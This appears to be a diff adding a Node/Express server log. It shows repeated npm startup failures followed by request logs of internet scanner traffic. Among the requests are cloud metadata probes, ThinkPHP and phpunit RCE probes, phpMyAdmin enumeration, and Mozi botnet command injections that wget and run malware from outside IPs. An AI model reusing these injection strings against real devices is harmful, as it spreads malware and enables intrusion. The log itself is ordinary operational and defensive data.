@@ -1,0 +1,661 @@
+
+> app@0.0.0 start /home/ubuntu/node-project/app
+> nodemon app.js
+
+[33m[nodemon] 2.0.2[39m
+[33m[nodemon] to restart at any time, enter `rs`[39m
+[33m[nodemon] watching dir(s): *.*[39m
+[33m[nodemon] watching extensions: js,mjs,json[39m
+[32m[nodemon] starting `node app.js`[39m
+events.js:183
+      throw er; // Unhandled 'error' event
+      ^
+
+Error: EBADF: bad file descriptor, read
+
+npm ERR! Linux 4.15.0-1051-aws
+npm ERR! argv "/usr/bin/node" "/usr/bin/npm" "start"
+npm ERR! node v8.10.0
+npm ERR! npm  v3.5.2
+npm ERR! code ELIFECYCLE
+npm ERR! app@0.0.0 start: `nodemon app.js`
+npm ERR! Exit status 1
+npm ERR! 
+npm ERR! Failed at the app@0.0.0 start script 'nodemon app.js'.
+npm ERR! Make sure you have the latest version of node.js and npm installed.
+npm ERR! If you do, this is most likely a problem with the app package,
+npm ERR! not with npm itself.
+npm ERR! Tell the author that this fails on your system:
+npm ERR!     nodemon app.js
+npm ERR! You can get information on how to open an issue for this project with:
+npm ERR!     npm bugs app
+npm ERR! Or if that isn't available, you can get their info via:
+npm ERR!     npm owner ls app
+npm ERR! There is likely additional logging output above.
+
+npm ERR! Please include the following file with any support request:
+npm ERR!     /home/ubuntu/node-project/app/npm-debug.log
+
+> app@0.0.0 start /home/ubuntu/node-project/app
+> nodemon app.js
+
+[33m[nodemon] 2.0.2[39m
+[33m[nodemon] to restart at any time, enter `rs`[39m
+[33m[nodemon] watching dir(s): *.*[39m
+[33m[nodemon] watching extensions: js,mjs,json[39m
+[32m[nodemon] starting `node app.js`[39m
+events.js:183
+      throw er; // Unhandled 'error' event
+      ^
+
+Error: EBADF: bad file descriptor, read
+
+npm ERR! Linux 4.15.0-1051-aws
+npm ERR! argv "/usr/bin/node" "/usr/bin/npm" "start"
+npm ERR! node v8.10.0
+npm ERR! npm  v3.5.2
+npm ERR! code ELIFECYCLE
+npm ERR! app@0.0.0 start: `nodemon app.js`
+npm ERR! Exit status 1
+npm ERR! 
+npm ERR! Failed at the app@0.0.0 start script 'nodemon app.js'.
+npm ERR! Make sure you have the latest version of node.js and npm installed.
+npm ERR! If you do, this is most likely a problem with the app package,
+npm ERR! not with npm itself.
+npm ERR! Tell the author that this fails on your system:
+npm ERR!     nodemon app.js
+npm ERR! You can get information on how to open an issue for this project with:
+npm ERR!     npm bugs app
+npm ERR! Or if that isn't available, you can get their info via:
+npm ERR!     npm owner ls app
+npm ERR! There is likely additional logging output above.
+
+npm ERR! Please include the following file with any support request:
+npm ERR!     /home/ubuntu/node-project/app/npm-debug.log
+
+> app@0.0.0 start /home/ubuntu/node-project/app
+> nodemon app.js
+
+[33m[nodemon] 2.0.2[39m
+[33m[nodemon] to restart at any time, enter `rs`[39m
+[33m[nodemon] watching dir(s): *.*[39m
+[33m[nodemon] watching extensions: js,mjs,json[39m
+[32m[nodemon] starting `node app.js`[39m
+events.js:183
+      throw er; // Unhandled 'error' event
+      ^
+
+Error: EBADF: bad file descriptor, read
+
+npm ERR! Linux 4.15.0-1051-aws
+npm ERR! argv "/usr/bin/node" "/usr/bin/npm" "start"
+npm ERR! node v8.10.0
+npm ERR! npm  v3.5.2
+npm ERR! code ELIFECYCLE
+npm ERR! app@0.0.0 start: `nodemon app.js`
+npm ERR! Exit status 1
+npm ERR! 
+npm ERR! Failed at the app@0.0.0 start script 'nodemon app.js'.
+npm ERR! Make sure you have the latest version of node.js and npm installed.
+npm ERR! If you do, this is most likely a problem with the app package,
+npm ERR! not with npm itself.
+npm ERR! Tell the author that this fails on your system:
+npm ERR!     nodemon app.js
+npm ERR! You can get information on how to open an issue for this project with:
+npm ERR!     npm bugs app
+npm ERR! Or if that isn't available, you can get their info via:
+npm ERR!     npm owner ls app
+npm ERR! There is likely additional logging output above.
+
+npm ERR! Please include the following file with any support request:
+npm ERR!     /home/ubuntu/node-project/app/npm-debug.log
+
+> app@0.0.0 start /home/ubuntu/node-project/app
+> nodemon app.js
+
+[33m[nodemon] 2.0.2[39m
+[33m[nodemon] to restart at any time, enter `rs`[39m
+[33m[nodemon] watching dir(s): *.*[39m
+[33m[nodemon] watching extensions: js,mjs,json[39m
+[32m[nodemon] starting `node app.js`[39m
+events.js:183
+      throw er; // Unhandled 'error' event
+      ^
+
+Error: EBADF: bad file descriptor, read
+
+npm ERR! Linux 4.15.0-1051-aws
+npm ERR! argv "/usr/bin/node" "/usr/bin/npm" "start"
+npm ERR! node v8.10.0
+npm ERR! npm  v3.5.2
+npm ERR! code ELIFECYCLE
+npm ERR! app@0.0.0 start: `nodemon app.js`
+npm ERR! Exit status 1
+npm ERR! 
+npm ERR! Failed at the app@0.0.0 start script 'nodemon app.js'.
+npm ERR! Make sure you have the latest version of node.js and npm installed.
+npm ERR! If you do, this is most likely a problem with the app package,
+npm ERR! not with npm itself.
+npm ERR! Tell the author that this fails on your system:
+npm ERR!     nodemon app.js
+npm ERR! You can get information on how to open an issue for this project with:
+npm ERR!     npm bugs app
+npm ERR! Or if that isn't available, you can get their info via:
+npm ERR!     npm owner ls app
+npm ERR! There is likely additional logging output above.
+
+npm ERR! Please include the following file with any support request:
+npm ERR!     /home/ubuntu/node-project/app/npm-debug.log
+
+> app@0.0.0 start /home/ubuntu/node-project/app
+> nodemon app.js
+
+[33m[nodemon] 2.0.2[39m
+[33m[nodemon] to restart at any time, enter `rs`[39m
+[33m[nodemon] watching dir(s): *.*[39m
+[33m[nodemon] watching extensions: js,mjs,json[39m
+[32m[nodemon] starting `node app.js`[39m
+events.js:183
+      throw er; // Unhandled 'error' event
+      ^
+
+Error: EBADF: bad file descriptor, read
+
+npm ERR! Linux 4.15.0-1051-aws
+npm ERR! argv "/usr/bin/node" "/usr/bin/npm" "start"
+npm ERR! node v8.10.0
+npm ERR! npm  v3.5.2
+npm ERR! code ELIFECYCLE
+npm ERR! app@0.0.0 start: `nodemon app.js`
+npm ERR! Exit status 1
+npm ERR! 
+npm ERR! Failed at the app@0.0.0 start script 'nodemon app.js'.
+npm ERR! Make sure you have the latest version of node.js and npm installed.
+npm ERR! If you do, this is most likely a problem with the app package,
+npm ERR! not with npm itself.
+npm ERR! Tell the author that this fails on your system:
+npm ERR!     nodemon app.js
+npm ERR! You can get information on how to open an issue for this project with:
+npm ERR!     npm bugs app
+npm ERR! Or if that isn't available, you can get their info via:
+npm ERR!     npm owner ls app
+npm ERR! There is likely additional logging output above.
+
+npm ERR! Please include the following file with any support request:
+npm ERR!     /home/ubuntu/node-project/app/npm-debug.log
+events.js:183
+      throw er; // Unhandled 'error' event
+      ^
+
+Error: listen EADDRINUSE :::9000
+    at Object._errnoException (util.js:1022:11)
+    at _exceptionWithHostPort (util.js:1044:20)
+    at Server.setupListenHandle [as _listen2] (net.js:1367:14)
+    at listenInCluster (net.js:1408:12)
+    at Server.listen (net.js:1492:7)
+    at Function.listen (/home/ubuntu/node-project/app/node_modules/express/lib/application.js:618:24)
+    at Object.<anonymous> (/home/ubuntu/node-project/app/app.js:46:18)
+    at Module._compile (module.js:652:30)
+    at Object.Module._extensions..js (module.js:663:10)
+    at Module.load (module.js:565:32)
+Express server listening on port 9000
+[0mGET / [36m304 [0m12.537 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m1.693 ms - -[0m
+[0mGET / [36m304 [0m1.438 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.337 ms - -[0m
+[0mGET / [36m304 [0m0.654 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.319 ms - -[0m
+[0mGET / [36m304 [0m0.696 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.280 ms - -[0m
+[0mGET / [36m304 [0m0.719 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.230 ms - -[0m
+[0mGET / [36m304 [0m0.679 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.261 ms - -[0m
+[0mGET / [36m304 [0m0.721 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.250 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.360 ms - -[0m
+[0mGET / [32m200 [0m0.969 ms - 207[0m
+[0mGET /stylesheets/style.css [32m200 [0m2.671 ms - 14750[0m
+[0mGET / [36m304 [0m0.665 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.313 ms - -[0m
+[0mGET /favicon.ico [33m404 [0m1.467 ms - 993[0m
+[0mGET / [32m200 [0m0.692 ms - 207[0m
+[0mGET /favicon.ico [33m404 [0m1.094 ms - 993[0m
+[0mGET / [32m200 [0m0.689 ms - 207[0m
+[0mGET / [32m200 [0m0.678 ms - 207[0m
+[0mPOST /editBlackAndWhiteList [33m404 [0m4.012 ms - 993[0m
+[0mGET / [32m200 [0m0.624 ms - 207[0m
+[0mGET / [32m200 [0m0.643 ms - 207[0m
+[0mGET / [32m200 [0m0.633 ms - 207[0m
+[0mGET / [32m200 [0m1.058 ms - 207[0m
+[0mGET / [32m200 [0m0.665 ms - 207[0m
+[0mGET /stylesheets/style.css [32m200 [0m0.693 ms - 14750[0m
+[0mGET /favicon.ico [33m404 [0m0.757 ms - 993[0m
+[0mGET / [32m200 [0m0.638 ms - 207[0m
+[0mGET /stylesheets/style.css [32m200 [0m0.483 ms - 14750[0m
+[0mGET /favicon.ico [33m404 [0m0.786 ms - 993[0m
+[0mGET http://example.com/ [32m200 [0m0.693 ms - 207[0m
+[0mGET http://169.254.169.254/ [32m200 [0m0.634 ms - 207[0m
+[0mGET http://[::ffff:a9fe:a9fe]/ [32m200 [0m0.640 ms - 207[0m
+[0mGET http://169.254.169.254/latest/dynamic/instance-identity/document [33m404 [0m0.925 ms - 993[0m
+[0mGET http://[::ffff:a9fe:a9fe]/latest/dynamic/instance-identity/document [33m404 [0m0.781 ms - 993[0m
+[0mGET / [32m200 [0m0.680 ms - 207[0m
+[0mGET / [32m200 [0m0.652 ms - 207[0m
+[0mGET / [32m200 [0m0.668 ms - 207[0m
+[0mGET /latest/dynamic/instance-identity/document [33m404 [0m0.840 ms - 993[0m
+[0mGET /latest/dynamic/instance-identity/document [33m404 [0m0.746 ms - 993[0m
+[0mGET / [32m200 [0m0.672 ms - 207[0m
+[0mGET /manager/text/list [33m404 [0m0.833 ms - 993[0m
+[0mGET / [32m200 [0m0.651 ms - 207[0m
+[0mGET /index.php [33m404 [0m0.766 ms - 993[0m
+[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m0.808 ms - 993[0m
+[0mPOST /GponForm/diag_Form?images/ [33m404 [0m4.488 ms - 993[0m
+[0mGET / [32m200 [0m1.271 ms - 207[0m
+[0mGET / [32m200 [0m0.658 ms - 207[0m
+[0mGET /robots.txt [33m404 [0m0.785 ms - 993[0m
+[0mGET /favicon.ico [33m404 [0m0.855 ms - 993[0m
+[0mGET / [32m200 [0m0.639 ms - 207[0m
+[0mGET /stylesheets/style.css [32m200 [0m0.968 ms - 14750[0m
+[0mGET /favicon.ico [33m404 [0m0.833 ms - 993[0m
+[0mGET / [32m200 [0m0.730 ms - 207[0m
+[0mGET / [32m200 [0m0.663 ms - 207[0m
+[0mGET /stylesheets/style.css [32m200 [0m0.508 ms - 14750[0m
+[0mGET /favicon.ico [33m404 [0m0.771 ms - 993[0m
+[0mGET / [32m200 [0m0.681 ms - 207[0m
+[0mGET /stylesheets/style.css [32m200 [0m0.491 ms - 14750[0m
+[0mGET /favicon.ico [33m404 [0m1.363 ms - 993[0m
+[0mGET http://example.com/ [32m200 [0m1.418 ms - 207[0m
+[0mGET http://169.254.169.254/ [32m200 [0m1.193 ms - 207[0m
+[0mGET http://[::ffff:a9fe:a9fe]/ [32m200 [0m0.776 ms - 207[0m
+[0mGET http://169.254.169.254/latest/dynamic/instance-identity/document [33m404 [0m1.122 ms - 993[0m
+[0mGET http://[::ffff:a9fe:a9fe]/latest/dynamic/instance-identity/document [33m404 [0m1.008 ms - 993[0m
+[0mGET / [32m200 [0m0.635 ms - 207[0m
+[0mGET / [32m200 [0m0.651 ms - 207[0m
+[0mGET / [32m200 [0m0.651 ms - 207[0m
+[0mGET /latest/dynamic/instance-identity/document [33m404 [0m0.784 ms - 993[0m
+[0mGET /latest/dynamic/instance-identity/document [33m404 [0m0.778 ms - 993[0m
+[0mGET / [32m200 [0m0.715 ms - 207[0m
+[0mGET / [32m200 [0m0.665 ms - 207[0m
+[0mHEAD /robots.txt [33m404 [0m0.786 ms - 993[0m
+[0mGET / [32m200 [0m3.985 ms - 207[0m
+[0mGET /manager/html [33m404 [0m0.827 ms - 993[0m
+[0mGET /manager/html [33m404 [0m0.755 ms - 993[0m
+[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m0.851 ms - 993[0m
+[0mGET / [32m200 [0m0.691 ms - 207[0m
+[0mGET / [32m200 [0m0.648 ms - 207[0m
+[0mGET / [32m200 [0m0.740 ms - 207[0m
+[0mGET http://example.com/ [32m200 [0m0.732 ms - 207[0m
+[0mGET http://169.254.169.254/ [32m200 [0m0.678 ms - 207[0m
+[0mGET http://[::ffff:a9fe:a9fe]/ [32m200 [0m0.668 ms - 207[0m
+[0mGET http://169.254.169.254/latest/dynamic/instance-identity/document [33m404 [0m0.779 ms - 993[0m
+[0mGET http://[::ffff:a9fe:a9fe]/latest/dynamic/instance-identity/document [33m404 [0m1.396 ms - 993[0m
+[0mGET / [32m200 [0m0.693 ms - 207[0m
+[0mGET / [32m200 [0m0.640 ms - 207[0m
+[0mGET / [32m200 [0m0.638 ms - 207[0m
+[0mGET /latest/dynamic/instance-identity/document [33m404 [0m0.780 ms - 993[0m
+[0mGET /latest/dynamic/instance-identity/document [33m404 [0m0.863 ms - 993[0m
+[0mGET / [32m200 [0m0.675 ms - 207[0m
+[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m0.823 ms - 993[0m
+[0mGET / [32m200 [0m0.683 ms - 207[0m
+[0mGET / [32m200 [0m0.658 ms - 207[0m
+[0mGET / [32m200 [0m0.650 ms - 207[0m
+[0mGET / [32m200 [0m0.646 ms - 207[0m
+[0mGET http://example.com/ [32m200 [0m0.669 ms - 207[0m
+[0mGET http://169.254.169.254/ [32m200 [0m0.667 ms - 207[0m
+[0mGET http://[::ffff:a9fe:a9fe]/ [32m200 [0m0.660 ms - 207[0m
+[0mGET http://169.254.169.254/latest/dynamic/instance-identity/document [33m404 [0m0.809 ms - 993[0m
+[0mGET http://[::ffff:a9fe:a9fe]/latest/dynamic/instance-identity/document [33m404 [0m0.792 ms - 993[0m
+[0mGET / [32m200 [0m0.647 ms - 207[0m
+[0mGET / [32m200 [0m0.665 ms - 207[0m
+[0mGET / [32m200 [0m0.642 ms - 207[0m
+[0mGET /latest/dynamic/instance-identity/document [33m404 [0m0.780 ms - 993[0m
+[0mGET /latest/dynamic/instance-identity/document [33m404 [0m0.809 ms - 993[0m
+[0mGET /TP/public/index.php [33m404 [0m2.716 ms - 993[0m
+[0mGET /TP/index.php [33m404 [0m0.783 ms - 993[0m
+[0mGET /thinkphp/html/public/index.php [33m404 [0m0.806 ms - 993[0m
+[0mGET /html/public/index.php [33m404 [0m0.863 ms - 993[0m
+[0mGET /public/index.php [33m404 [0m0.802 ms - 993[0m
+[0mGET /TP/html/public/index.php [33m404 [0m0.746 ms - 993[0m
+[0mGET /elrekt.php [33m404 [0m0.758 ms - 993[0m
+[0mGET /index.php [33m404 [0m0.770 ms - 993[0m
+[0mGET / [32m200 [0m0.651 ms - 207[0m
+[0mGET / [32m200 [0m0.698 ms - 207[0m
+[0mGET / [32m200 [0m0.685 ms - 207[0m
+[0mGET /TP/public/index.php [33m404 [0m0.747 ms - 993[0m
+[0mGET /TP/index.php [33m404 [0m0.763 ms - 993[0m
+[0mGET /thinkphp/html/public/index.php [33m404 [0m0.840 ms - 993[0m
+[0mGET /html/public/index.php [33m404 [0m0.742 ms - 993[0m
+[0mGET /public/index.php [33m404 [0m0.795 ms - 993[0m
+[0mGET /TP/html/public/index.php [33m404 [0m0.739 ms - 993[0m
+[0mGET /elrekt.php [33m404 [0m0.762 ms - 993[0m
+[0mGET /index.php [33m404 [0m0.754 ms - 993[0m
+[0mGET / [32m200 [0m0.630 ms - 207[0m
+[0mGET / [32m200 [0m0.659 ms - 207[0m
+[0mGET / [32m200 [0m0.695 ms - 207[0m
+[0mGET / [32m200 [0m0.695 ms - 207[0m
+[0mHEAD /robots.txt [33m404 [0m0.756 ms - 993[0m
+[0mGET / [32m200 [0m0.686 ms - 207[0m
+[0mGET http://example.com/ [32m200 [0m0.706 ms - 207[0m
+[0mGET http://169.254.169.254/ [32m200 [0m0.692 ms - 207[0m
+[0mGET http://[::ffff:a9fe:a9fe]/ [32m200 [0m0.639 ms - 207[0m
+[0mGET http://169.254.169.254/latest/dynamic/instance-identity/document [33m404 [0m0.794 ms - 993[0m
+[0mGET http://[::ffff:a9fe:a9fe]/latest/dynamic/instance-identity/document [33m404 [0m1.317 ms - 993[0m
+[0mGET / [32m200 [0m0.633 ms - 207[0m
+[0mGET / [32m200 [0m0.708 ms - 207[0m
+[0mGET / [32m200 [0m0.639 ms - 207[0m
+[0mGET /latest/dynamic/instance-identity/document [33m404 [0m0.789 ms - 993[0m
+[0mGET /latest/dynamic/instance-identity/document [33m404 [0m0.806 ms - 993[0m
+[0mGET / [32m200 [0m0.659 ms - 207[0m
+[0mGET / [32m200 [0m0.697 ms - 207[0m
+[0mGET / [32m200 [0m0.674 ms - 207[0m
+[0mGET / [32m200 [0m0.641 ms - 207[0m
+[0mGET / [32m200 [0m0.661 ms - 207[0m
+[0mGET / [32m200 [0m0.664 ms - 207[0m
+[0mGET http://example.com/ [32m200 [0m0.652 ms - 207[0m
+[0mGET http://169.254.169.254/ [32m200 [0m0.672 ms - 207[0m
+[0mGET http://[::ffff:a9fe:a9fe]/ [32m200 [0m0.663 ms - 207[0m
+[0mGET http://169.254.169.254/latest/dynamic/instance-identity/document [33m404 [0m5.325 ms - 993[0m
+[0mGET http://[::ffff:a9fe:a9fe]/latest/dynamic/instance-identity/document [33m404 [0m0.808 ms - 993[0m
+[0mGET / [32m200 [0m0.646 ms - 207[0m
+[0mGET / [32m200 [0m0.654 ms - 207[0m
+[0mGET / [32m200 [0m0.638 ms - 207[0m
+[0mGET /latest/dynamic/instance-identity/document [33m404 [0m0.764 ms - 993[0m
+[0mGET /latest/dynamic/instance-identity/document [33m404 [0m0.810 ms - 993[0m
+[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.690 ms - 993[0m
+[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.658 ms - 207[0m
+[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.728 ms - 207[0m
+[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m1.180 ms - 993[0m
+[0mGET http://5.188.210.101/echo.php [33m404 [0m0.841 ms - 993[0m
+[0mGET / [32m200 [0m0.657 ms - 207[0m
+[0mGET / [32m200 [0m0.720 ms - 207[0m
+[0mHEAD http://123.125.114.144/ [32m200 [0m0.706 ms - 207[0m
+[0mGET http://www.123cha.com/ [0m- [0m- ms - -[0m
+[0mGET http://www.wujieliulan.com/ [0m- [0m- ms - -[0m
+[0mGET http://www.epochtimes.com/ [0m- [0m- ms - -[0m
+[0mGET http://www.rfa.org/english/ [0m- [0m- ms - -[0m
+[0mGET http://boxun.com/ [0m- [0m- ms - -[0m
+[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m17.083 ms - 993[0m
+[0mGET / [32m200 [0m0.674 ms - 207[0m
+[0mGET http://5.188.210.101/echo.php [33m404 [0m0.824 ms - 993[0m
+[0mGET / [32m200 [0m0.641 ms - 207[0m
+[0mPOST /editBlackAndWhiteList [33m404 [0m0.698 ms - 993[0m
+[0mGET http://example.com/ [32m200 [0m0.650 ms - 207[0m
+[0mGET http://169.254.169.254/ [32m200 [0m0.639 ms - 207[0m
+[0mGET http://[::ffff:a9fe:a9fe]/ [32m200 [0m0.653 ms - 207[0m
+[0mGET http://169.254.169.254/latest/dynamic/instance-identity/document [33m404 [0m0.741 ms - 993[0m
+[0mGET http://[::ffff:a9fe:a9fe]/latest/dynamic/instance-identity/document [33m404 [0m0.746 ms - 993[0m
+[0mGET / [32m200 [0m0.625 ms - 207[0m
+[0mGET / [32m200 [0m0.708 ms - 207[0m
+[0mGET / [32m200 [0m0.643 ms - 207[0m
+[0mGET /latest/dynamic/instance-identity/document [33m404 [0m0.753 ms - 993[0m
+[0mGET /latest/dynamic/instance-identity/document [33m404 [0m0.765 ms - 993[0m
+[0mGET / [32m200 [0m0.651 ms - 207[0m
+[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://176.113.161.87:45399/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m0.714 ms - 993[0m
+[0mGET / [32m200 [0m0.622 ms - 207[0m
+[0mPOST /HNAP1/ [33m404 [0m0.689 ms - 993[0m
+[0mGET /.env [33m404 [0m0.677 ms - 993[0m
+[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m0.777 ms - 993[0m
+[0mGET / [32m200 [0m0.678 ms - 207[0m
+[0mGET /robots.txt [33m404 [0m0.716 ms - 993[0m
+[0mGET /sitemap.xml [33m404 [0m0.732 ms - 993[0m
+[0mGET /.well-known/security.txt [33m404 [0m0.726 ms - 993[0m
+[0mGET /favicon.ico [33m404 [0m0.776 ms - 993[0m
+[0mGET / [32m200 [0m0.639 ms - 207[0m
+[0mGET http://example.com/ [32m200 [0m0.642 ms - 207[0m
+[0mGET http://169.254.169.254/ [32m200 [0m0.595 ms - 207[0m
+[0mGET http://[::ffff:a9fe:a9fe]/ [32m200 [0m0.651 ms - 207[0m
+[0mGET http://169.254.169.254/latest/dynamic/instance-identity/document [33m404 [0m0.769 ms - 993[0m
+[0mGET http://[::ffff:a9fe:a9fe]/latest/dynamic/instance-identity/document [33m404 [0m0.759 ms - 993[0m
+[0mGET / [32m200 [0m1.086 ms - 207[0m
+[0mGET / [32m200 [0m0.620 ms - 207[0m
+[0mGET / [32m200 [0m0.660 ms - 207[0m
+[0mGET /latest/dynamic/instance-identity/document [33m404 [0m0.783 ms - 993[0m
+[0mGET /latest/dynamic/instance-identity/document [33m404 [0m0.760 ms - 993[0m
+[0mHEAD /robots.txt [33m404 [0m0.789 ms - 993[0m
+[0mGET /manager/html [33m404 [0m0.756 ms - 993[0m
+[0mGET / [32m200 [0m0.662 ms - 207[0m
+[0mGET / [32m200 [0m0.649 ms - 207[0m
+[0mGET / [32m200 [0m0.610 ms - 207[0m
+[0mGET /robots.txt [33m404 [0m0.759 ms - 993[0m
+[0mGET /favicon.ico [33m404 [0m0.782 ms - 993[0m
+[0mGET / [32m200 [0m0.723 ms - 207[0m
+[0mGET / [32m200 [0m0.637 ms - 207[0m
+[0mGET /robots.txt [33m404 [0m0.812 ms - 993[0m
+[0mGET /favicon.ico [33m404 [0m0.810 ms - 993[0m
+[0mGET / [32m200 [0m0.652 ms - 207[0m
+[0mGET / [32m200 [0m0.640 ms - 207[0m
+[0mGET / [32m200 [0m0.656 ms - 207[0m
+[0mGET / [32m200 [0m0.613 ms - 207[0m
+[0mGET / [32m200 [0m0.702 ms - 207[0m
+[0mGET http://www.msftncsi.com/ncsi.txt [33m404 [0m0.777 ms - 993[0m
+[0mGET /HNAP1/ [33m404 [0m0.729 ms - 993[0m
+[0mGET /hudson/script [33m404 [0m0.746 ms - 993[0m
+[0mGET /script [33m404 [0m0.744 ms - 993[0m
+[0mGET /sqlite/main.php [33m404 [0m0.759 ms - 993[0m
+[0mGET /sqlitemanager/main.php [33m404 [0m0.776 ms - 993[0m
+[0mGET /SQLiteManager/main.php [33m404 [0m1.212 ms - 993[0m
+[0mGET /SQLite/main.php [33m404 [0m0.783 ms - 993[0m
+[0mGET /SQlite/main.php [33m404 [0m0.774 ms - 993[0m
+[0mGET /main.php [33m404 [0m4.304 ms - 993[0m
+[0mGET /test/sqlite/SQLiteManager-1.2.0/SQLiteManager-1.2.0/main.php [33m404 [0m0.776 ms - 993[0m
+[0mGET /SQLiteManager-1.2.4/main.php [33m404 [0m0.808 ms - 993[0m
+[0mGET /agSearch/SQlite/main.php [33m404 [0m0.830 ms - 993[0m
+[0mGET /phpmyadmin/ [33m404 [0m0.774 ms - 993[0m
+[0mGET /phpMyAdmin/ [33m404 [0m0.790 ms - 993[0m
+[0mGET /PMA/ [33m404 [0m0.774 ms - 993[0m
+[0mGET /pma/ [33m404 [0m0.746 ms - 993[0m
+[0mGET /admin/ [33m404 [0m0.743 ms - 993[0m
+[0mGET /dbadmin/ [33m404 [0m0.780 ms - 993[0m
+[0mGET /mysql/ [33m404 [0m0.793 ms - 993[0m
+[0mGET /myadmin/ [33m404 [0m0.832 ms - 993[0m
+[0mGET /openserver/phpmyadmin/ [33m404 [0m0.758 ms - 993[0m
+[0mGET /phpmyadmin2/ [33m404 [0m0.740 ms - 993[0m
+[0mGET /phpMyAdmin2/ [33m404 [0m0.798 ms - 993[0m
+[0mGET /phpMyAdmin-2/ [33m404 [0m0.785 ms - 993[0m
+[0mGET /php-my-admin/ [33m404 [0m0.815 ms - 993[0m
+[0mGET /phpMyAdmin-2.2.3/ [33m404 [0m0.752 ms - 993[0m
+[0mGET /phpMyAdmin-2.2.6/ [33m404 [0m0.783 ms - 993[0m
+[0mGET /phpMyAdmin-2.5.1/ [33m404 [0m0.785 ms - 993[0m
+[0mGET /phpMyAdmin-2.5.4/ [33m404 [0m0.729 ms - 993[0m
+[0mGET /phpMyAdmin-2.5.5-rc1/ [33m404 [0m0.729 ms - 993[0m
+[0mGET /phpMyAdmin-2.5.5-rc2/ [33m404 [0m1.206 ms - 993[0m
+[0mGET /phpMyAdmin-2.5.5/ [33m404 [0m0.727 ms - 993[0m
+[0mGET /phpMyAdmin-2.5.5-pl1/ [33m404 [0m0.784 ms - 993[0m
+[0mGET /phpMyAdmin-2.5.6-rc1/ [33m404 [0m0.775 ms - 993[0m
+[0mGET /phpMyAdmin-2.5.6-rc2/ [33m404 [0m0.742 ms - 993[0m
+[0mGET /phpMyAdmin-2.5.6/ [33m404 [0m0.786 ms - 993[0m
+[0mGET /phpMyAdmin-2.5.7/ [33m404 [0m0.764 ms - 993[0m
+[0mGET /phpMyAdmin-2.5.7-pl1/ [33m404 [0m0.758 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.0-alpha/ [33m404 [0m0.783 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.0-alpha2/ [33m404 [0m0.786 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.0-beta1/ [33m404 [0m0.752 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.0-beta2/ [33m404 [0m0.747 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.0-rc1/ [33m404 [0m0.760 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.0-rc2/ [33m404 [0m1.202 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.0-rc3/ [33m404 [0m0.761 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.0/ [33m404 [0m0.748 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.0-pl1/ [33m404 [0m0.740 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.0-pl2/ [33m404 [0m0.752 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.0-pl3/ [33m404 [0m0.749 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.1-rc1/ [33m404 [0m0.755 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.1-rc2/ [33m404 [0m0.766 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.1/ [33m404 [0m0.830 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.1-pl1/ [33m404 [0m0.765 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.1-pl2/ [33m404 [0m0.746 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.1-pl3/ [33m404 [0m0.745 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.2-rc1/ [33m404 [0m1.216 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.2-beta1/ [33m404 [0m0.797 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.2-rc1/ [33m404 [0m0.789 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.2/ [33m404 [0m0.764 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.2-pl1/ [33m404 [0m0.735 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.3/ [33m404 [0m0.769 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.3-rc1/ [33m404 [0m0.764 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.3/ [33m404 [0m0.779 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.3-pl1/ [33m404 [0m0.760 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.4-rc1/ [33m404 [0m0.701 ms - 993[0m
+[0mGET /phpMyAdmin-2.6.4-pl1/ [33m404 [0m1.608 ms - 993[0m
